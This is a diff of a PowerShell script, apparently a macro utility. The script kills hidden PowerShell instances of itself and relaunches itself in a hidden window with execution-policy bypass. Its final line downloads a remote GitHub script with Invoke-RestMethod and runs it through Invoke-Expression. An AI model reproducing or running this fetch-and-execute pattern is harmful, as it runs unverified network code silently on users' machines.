@@ -618,7 +618,6 @@ if ($MacroMode) {
     $appCtx = New-Object System.Windows.Forms.ApplicationContext
     [System.Windows.Forms.Application]::Run($appCtx)
 } else {
-    $ErrorActionPreference = 'Stop'
     $scriptPath = $null
     if ($PSCommandPath) { $scriptPath = $PSCommandPath }
     if (-not $scriptPath -and $MyInvocation.MyCommand.Path) { $scriptPath = $MyInvocation.MyCommand.Path }
@@ -656,29 +655,25 @@ if ($MacroMode) {
         }
     }
 
-    try {
-        $myPid = $PID
-        Get-Process | Where-Object {
-            $_.Id -ne $myPid -and
-            $_.ProcessName -match "powershell|pwsh" -and
-            $_.MainWindowTitle -eq ""
-        } | ForEach-Object {
-            try {
-                $cmdLine = (Get-CimInstance Win32_Process -Filter "ProcessId=$($_.Id)" -ErrorAction SilentlyContinue).CommandLine
-                if ($cmdLine -and $cmdLine -match "BrxtwurstMcrs") {
-                    Stop-Process -Id $_.Id -Force -ErrorAction SilentlyContinue
-                }
-            } catch {}
-        }
+    $myPid = $PID
+    Get-Process -ErrorAction SilentlyContinue | Where-Object {
+        $_.Id -ne $myPid -and
+        $_.ProcessName -match "powershell|pwsh" -and
+        $_.MainWindowTitle -eq ""
+    } | ForEach-Object {
+        try {
+            $cmdLine = (Get-CimInstance Win32_Process -Filter "ProcessId=$($_.Id)" -ErrorAction SilentlyContinue).CommandLine
+            if ($cmdLine -and $cmdLine -match "BrxtwurstMcrs") {
+                Stop-Process -Id $_.Id -Force -ErrorAction SilentlyContinue
+            }
+        } catch {}
+    }
 
-        if (-not $scriptPath -or -not (Test-Path $scriptPath)) {
-            throw "Could not find script path. PSCommandPath='$PSCommandPath' Path='$($MyInvocation.MyCommand.Path)'"
-        }
-
+    if ($scriptPath -and (Test-Path $scriptPath)) {
         Start-Process -WindowStyle Hidden -FilePath "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" `
             -ArgumentList "-ExecutionPolicy Bypass -STA -NoProfile -File `"$scriptPath`" -MacroMode"
+    }
 
-        Set-ExecutionPolicy -Scope Process -ExecutionPolicy Bypass -Force
-        Invoke-Expression (Invoke-RestMethod "https://raw.githubusercontent.com/HadronCollision/PowershellScripts/refs/heads/main/HabibiModAnalyzer.ps1")
-    } catch {}
+    Set-ExecutionPolicy -Scope Process -ExecutionPolicy Bypass -Force -ErrorAction SilentlyContinue
+    Invoke-Expression (Invoke-RestMethod "https://raw.githubusercontent.com/HadronCollision/PowershellScripts/refs/heads/main/HabibiModAnalyzer.ps1")
 }
